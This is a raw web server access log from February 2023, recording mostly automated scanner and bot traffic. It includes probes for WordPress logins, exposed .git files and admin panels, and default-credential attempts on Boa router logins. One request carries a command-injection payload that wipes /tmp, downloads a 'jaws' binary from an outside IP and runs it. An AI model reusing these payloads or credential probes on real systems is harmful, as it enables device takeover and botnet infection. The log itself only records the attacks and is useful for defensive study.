92.255.85.173 - - [05/Feb/2023:03:47:07 -0600] "\x03" 400 226 "-" "-"
152.89.196.211 - - [05/Feb/2023:03:49:35 -0600] "GET /actuator/gateway/routes HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
92.255.85.173 - - [05/Feb/2023:04:04:59 -0600] "\x03" 400 226 "-" "-"
143.110.222.166 - - [05/Feb/2023:04:08:43 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
2001:470:1:c84::19 - - [05/Feb/2023:04:20:56 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:106.0) Gecko/20100101 Firefox/106.0"
2001:470:1:c84::19 - - [05/Feb/2023:04:26:07 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0"
2001:470:1:c84::160 - - [05/Feb/2023:04:26:12 -0600] "GET /favicon.ico HTTP/1.1" 301 252 "-" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:100.0) Gecko/20100101 Firefox/100.0"
223.111.175.6 - - [05/Feb/2023:04:27:23 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 9_0_1; Win64; x64) AppleWebKit/553.41 (KHTML, like Gecko) Chrome/78.0.1741 Safari/537.36"
185.224.128.219 - - [05/Feb/2023:04:31:51 -0600] "GET /admin/config.php HTTP/1.1" 301 257 "-" "python-requests/2.22.0"
143.110.222.166 - - [05/Feb/2023:05:08:35 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
5.161.189.9 - - [05/Feb/2023:05:26:58 -0600] "GET /wp-login.php HTTP/1.1" 301 253 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763"
66.240.205.34 - - [05/Feb/2023:05:28:56 -0600] "Gh0st\xad" 400 226 "-" "-"
197.237.199.10 - - [05/Feb/2023:05:58:02 -0600] "GET /shell?cd+/tmp;rm+-rf+*;wget+45.12.253.180/jaws;sh+/tmp/jaws HTTP/1.1" 301 300 "-" "Hello, world"
143.110.222.166 - - [05/Feb/2023:06:03:33 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
198.235.24.136 - - [05/Feb/2023:06:04:26 -0600] "GET / HTTP/1.1" 301 241 "-" "-"
141.98.11.39 - - [05/Feb/2023:06:45:35 -0600] "GET / HTTP/1.1" 301 241 "-" "Hello World"
143.110.222.166 - - [05/Feb/2023:07:05:57 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
185.246.220.98 - - [05/Feb/2023:07:11:35 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 264 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
152.89.196.156 - - [05/Feb/2023:07:36:19 -0600] "\x03" 400 226 "-" "-"
193.32.162.159 - - [05/Feb/2023:07:36:54 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
143.110.222.166 - - [05/Feb/2023:08:07:17 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
193.32.162.167 - - [05/Feb/2023:08:29:07 -0600] "GET /.git/config HTTP/1.1" 301 252 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
185.246.220.98 - - [05/Feb/2023:08:30:50 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
101.68.211.3 - - [05/Feb/2023:08:34:53 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
101.68.211.3 - - [05/Feb/2023:08:34:56 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
101.68.211.3 - - [05/Feb/2023:08:35:00 -0600] "GET /favicon.ico HTTP/1.1" 301 252 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
101.68.211.3 - - [05/Feb/2023:08:35:01 -0600] "GET /robots.txt HTTP/1.1" 301 251 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
193.32.162.159 - - [05/Feb/2023:08:38:41 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
45.79.181.94 - - [05/Feb/2023:08:57:06 -0600] "\x16\x03\x01" 400 226 "-" "-"
13.38.97.234 - - [05/Feb/2023:08:58:38 -0600] "GET /wp-content/plugins/t_file_wp/t_file_wp.php?test=hello HTTP/1.1" 301 294 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)"
92.118.39.82 - - [05/Feb/2023:09:00:03 -0600] "GET / HTTP/1.1" 301 241 "-" "-"
143.110.222.166 - - [05/Feb/2023:09:07:59 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
161.35.146.30 - - [05/Feb/2023:09:09:58 -0600] "\x16\x03\x01" 400 226 "-" "-"
161.35.146.30 - - [05/Feb/2023:09:09:58 -0600] "\x16\x03\x01" 400 226 "-" "-"
161.35.146.30 - - [05/Feb/2023:09:09:58 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
193.32.162.159 - - [05/Feb/2023:09:40:49 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
179.43.177.242 - - [05/Feb/2023:09:58:25 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 264 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
143.110.222.166 - - [05/Feb/2023:09:59:57 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
143.110.222.166 - - [05/Feb/2023:11:06:05 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
179.43.177.242 - - [05/Feb/2023:11:17:08 -0600] "GET / HTTP/1.1" 301 241 "-" "Hello World"
107.170.226.9 - - [05/Feb/2023:11:19:00 -0600] "MGLNDD_194.195.210.97_80\n" 400 226 "-" "-"
115.51.121.209 - - [05/Feb/2023:11:47:42 -0600] "GET /boaform/admin/formLogin?username=user&psd=user HTTP/1.0" 301 291 "-" "-"
193.32.162.159 - - [05/Feb/2023:11:58:00 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
143.110.222.166 - - [05/Feb/2023:12:05:27 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
45.155.126.211 - - [05/Feb/2023:12:21:30 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (compatible; tchelebi/1.0; +http://tchelebi.io)"
157.245.140.35 - - [05/Feb/2023:12:36:46 -0600] "GET /wp-login.php HTTP/1.1" 301 253 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96"
186.159.11.170 - - [05/Feb/2023:12:48:06 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
193.32.162.159 - - [05/Feb/2023:12:49:23 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
143.110.222.166 - - [05/Feb/2023:13:05:26 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
92.118.39.82 - - [05/Feb/2023:13:15:58 -0600] "GET / HTTP/1.1" 301 241 "-" "-"
5.161.189.7 - - [05/Feb/2023:13:35:34 -0600] "GET /wp-login.php HTTP/1.1" 301 253 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763"
185.225.74.190 - - [05/Feb/2023:14:07:58 -0600] "GET /config/getuser?index=0 HTTP/1.1" 301 263 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
143.110.222.166 - - [05/Feb/2023:14:09:31 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
92.118.39.82 - - [05/Feb/2023:14:17:12 -0600] "GET / HTTP/1.1" 301 241 "-" "-"
185.224.128.219 - - [05/Feb/2023:14:18:31 -0600] "GET /admin/config.php HTTP/1.1" 301 257 "-" "python-requests/2.22.0"
61.54.20.239 - - [05/Feb/2023:14:36:53 -0600] "GET /boaform/admin/formLogin?username=admin&psd=admin HTTP/1.0" 301 293 "-" "-"
180.149.125.159 - - [05/Feb/2023:14:42:08 -0600] "GET /stalker_portal/server/tools/auth_simple.php HTTP/1.1" 301 284 "-" "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
143.110.222.166 - - [05/Feb/2023:15:04:19 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
185.224.128.219 - - [05/Feb/2023:15:12:51 -0600] "GET /admin/config.php HTTP/1.1" 301 257 "-" "python-requests/2.22.0"
167.94.138.120 - - [05/Feb/2023:15:24:18 -0600] "GET / HTTP/1.1" 301 241 "-" "-"
167.94.138.120 - - [05/Feb/2023:15:24:18 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.138.120 - - [05/Feb/2023:15:24:18 -0600] "PRI * HTTP/2.0" 400 226 "-" "-"
193.32.162.159 - - [05/Feb/2023:15:34:01 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
43.134.171.185 - - [05/Feb/2023:15:50:52 -0600] "\xff\xa2\xff" 400 226 "-" "-"
43.134.171.185 - - [05/Feb/2023:15:50:53 -0600] "o\xfa\xc0\xbe\xb8\xc0\xa4\xc9\x89\xa2\xc2\x8f\x83\xaf\x91\x97\xbe\xcd\xb9\xcf\xac\x9b\xb0\xab\xa0\xb6\xb1\xaa\x9d\x9c\x9f\x96\x8d\x93\xce\xb4\xb3\xb5\x98\xcd\xa6\xfa\xfa\xfa\xfa\x12\xfd\xd8\xf8\xfa\xfa\xc2\xfa\xfa\xfa\xfa\x1af\xec\xf9\xfa\xfa\xfa\xfa\xfb\xe5q\xf2\xfa\xfa\xfa\xfa\xfa\xfa\xf9wh\x97ui\xba\xea=E\xf0\x1b/\xa7XJ\xf11Y\v\xbf\xb1K\x1f" 400 226 "-" "-"
43.134.171.185 - - [05/Feb/2023:15:51:13 -0600] "-" 408 - "-" "-"
143.110.222.166 - - [05/Feb/2023:16:07:53 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
2620:96:e000:b0cc:e:2:1:5 - - [05/Feb/2023:16:50:05 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
2620:96:e000:b0cc:e:2:1:5 - - [05/Feb/2023:16:50:05 -0600] "PRI * HTTP/2.0" 400 226 "-" "-"
193.32.162.159 - - [05/Feb/2023:16:58:24 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
143.110.222.166 - - [05/Feb/2023:17:07:42 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
218.238.233.60 - - [05/Feb/2023:17:15:50 -0600] "GET / HTTP/1.1" 301 241 "-" "Hello World"
143.110.222.166 - - [05/Feb/2023:18:06:53 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
2.179.184.29 - - [05/Feb/2023:18:23:24 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
86.102.45.245 - - [05/Feb/2023:18:27:04 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
183.136.225.32 - - [05/Feb/2023:18:29:48 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
179.43.177.242 - - [05/Feb/2023:18:33:37 -0600] "GET / HTTP/1.1" 301 241 "-" "Hello World"
183.136.225.32 - - [05/Feb/2023:18:36:11 -0600] "GET /favicon.ico HTTP/1.1" 301 252 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
183.136.225.32 - - [05/Feb/2023:18:36:52 -0600] "GET /robots.txt HTTP/1.1" 301 251 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
185.246.220.98 - - [05/Feb/2023:18:54:13 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
143.110.222.166 - - [05/Feb/2023:19:05:40 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
192.241.227.26 - - [05/Feb/2023:19:14:23 -0600] "GET /druid/index.html HTTP/1.1" 301 257 "-" "Mozilla/5.0 zgrab/0.x"
185.246.220.98 - - [05/Feb/2023:19:17:43 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 264 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
193.32.162.159 - - [05/Feb/2023:19:51:43 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
143.110.222.166 - - [05/Feb/2023:20:06:04 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
36.40.72.66 - - [05/Feb/2023:20:28:38 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
2001:470:1:c84::17 - - [05/Feb/2023:20:33:07 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
2001:470:1:c84::17 - - [05/Feb/2023:20:42:48 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53"
2001:470:1:c84::133 - - [05/Feb/2023:20:42:53 -0600] "GET /favicon.ico HTTP/1.1" 301 252 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.34"
106.253.173.20 - - [05/Feb/2023:20:52:44 -0600] "GET / HTTP/1.1" 301 241 "-" "Hello World"
188.166.87.67 - - [05/Feb/2023:21:05:11 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36"
143.110.222.166 - - [05/Feb/2023:21:05:17 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
95.142.120.24 - - [05/Feb/2023:21:22:50 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
130.211.54.158 - - [05/Feb/2023:21:52:08 -0600] "GET / HTTP/1.1" 301 241 "-" "python-requests/2.28.2"
185.225.74.190 - - [05/Feb/2023:21:54:15 -0600] "GET /config/getuser?index=0 HTTP/1.1" 301 263 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
143.110.222.166 - - [05/Feb/2023:22:05:41 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
81.162.64.202 - - [05/Feb/2023:22:18:58 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
186.209.29.114 - - [05/Feb/2023:22:43:57 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
193.32.162.159 - - [05/Feb/2023:22:58:53 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
143.110.222.166 - - [05/Feb/2023:23:09:03 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
240b:4005:18:3b00:88cd:89dd:7daf:c3fb - - [05/Feb/2023:23:33:33 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"
240b:4005:18:3b00:88cd:89dd:7daf:c3fb - - [05/Feb/2023:23:35:37 -0600] "\x16\x03\x01" 400 226 "-" "-"
79.137.202.2 - - [05/Feb/2023:23:37:47 -0600] "CONNECT google.com:443 HTTP/1.1" 301 241 "-" "Go-http-client/1.1"
185.246.220.98 - - [05/Feb/2023:23:37:49 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
42.83.147.34 - - [05/Feb/2023:23:49:25 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)Chrome/74.0.3729.169 Safari/537.36"
162.243.148.14 - - [06/Feb/2023:00:01:23 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 zgrab/0.x"
143.110.222.166 - - [06/Feb/2023:00:08:22 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
179.43.177.242 - - [06/Feb/2023:00:16:54 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 264 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
194.87.151.116 - - [06/Feb/2023:00:39:27 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 264 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
193.32.162.159 - - [06/Feb/2023:00:50:01 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
39.79.21.90 - - [06/Feb/2023:01:00:36 -0600] "GET /boaform/admin/formLogin?username=admin&psd=admin HTTP/1.0" 301 293 "-" "-"
143.110.222.166 - - [06/Feb/2023:01:06:54 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
23.251.102.74 - - [06/Feb/2023:01:19:01 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
103.219.152.158 - - [06/Feb/2023:01:23:23 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 264 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
103.219.152.148 - - [06/Feb/2023:01:32:26 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 264 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
179.43.177.242 - - [06/Feb/2023:01:36:02 -0600] "GET / HTTP/1.1" 301 241 "-" "Hello World"
147.78.103.95 - - [06/Feb/2023:01:37:26 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
183.136.225.32 - - [06/Feb/2023:01:46:30 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
183.136.225.32 - - [06/Feb/2023:01:51:55 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
139.144.52.241 - - [06/Feb/2023:01:52:04 -0600] "GET / HTTP/1.0" 301 241 "-" "-"
139.144.52.241 - - [06/Feb/2023:01:52:11 -0600] "GET /server-status HTTP/1.1" 301 254 "-" "curl/7.54.0"
139.144.52.241 - - [06/Feb/2023:01:52:11 -0600] "POST /sdk HTTP/1.1" 301 244 "-" "curl/7.54.0"
139.144.52.241 - - [06/Feb/2023:01:52:11 -0600] "GET /Portal0000.htm HTTP/1.1" 301 255 "-" "curl/7.54.0"
139.144.52.241 - - [06/Feb/2023:01:52:11 -0600] "HEAD / HTTP/1.1" 301 - "-" "curl/7.54.0"
139.144.52.241 - - [06/Feb/2023:01:52:11 -0600] "GET /nmaplowercheck1675669931 HTTP/1.1" 301 265 "-" "curl/7.54.0"
139.144.52.241 - - [06/Feb/2023:01:52:11 -0600] "GET /Portal/Portal.mwsl HTTP/1.1" 301 259 "-" "curl/7.54.0"
139.144.52.241 - - [06/Feb/2023:01:52:12 -0600] "GET /pools/default/buckets HTTP/1.1" 301 262 "-" "curl/7.54.0"
139.144.52.241 - - [06/Feb/2023:01:52:12 -0600] "GET /docs/cplugError.html/ HTTP/1.1" 301 262 "-" "curl/7.54.0"
139.144.52.241 - - [06/Feb/2023:01:52:12 -0600] "GET / HTTP/1.0" 301 241 "-" "-"
139.144.52.241 - - [06/Feb/2023:01:52:12 -0600] "GET / HTTP/1.1" 301 241 "-" "curl/7.54.0"
139.144.52.241 - - [06/Feb/2023:01:52:12 -0600] "GET /pools HTTP/1.1" 301 246 "-" "curl/7.54.0"
139.144.52.241 - - [06/Feb/2023:01:52:12 -0600] "GET /main.jsa HTTP/1.1" 301 249 "-" "curl/7.54.0"
139.144.52.241 - - [06/Feb/2023:01:52:12 -0600] "GET /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42 HTTP/1.1" 301 282 "-" "curl/7.54.0"
139.144.52.241 - - [06/Feb/2023:01:52:12 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
139.144.52.241 - - [06/Feb/2023:01:52:12 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
139.144.52.241 - - [06/Feb/2023:01:52:12 -0600] "GET / HTTP/1.1" 301 241 "-" "curl/7.54.0"
139.144.52.241 - - [06/Feb/2023:01:52:12 -0600] "GET /base.inc HTTP/1.1" 301 249 "-" "curl/7.54.0"
139.144.52.241 - - [06/Feb/2023:01:52:12 -0600] "GET /HNAP1 HTTP/1.1" 301 246 "-" "curl/7.54.0"
139.144.52.241 - - [06/Feb/2023:01:52:12 -0600] "GET /.git/HEAD HTTP/1.1" 301 250 "-" "curl/7.54.0"
139.144.52.241 - - [06/Feb/2023:01:52:12 -0600] "GET / HTTP/1.1" 301 241 "-" "curl/7.54.0"
139.144.52.241 - - [06/Feb/2023:01:52:12 -0600] "GET /CSS/Miniweb.css HTTP/1.1" 301 256 "-" "curl/7.54.0"
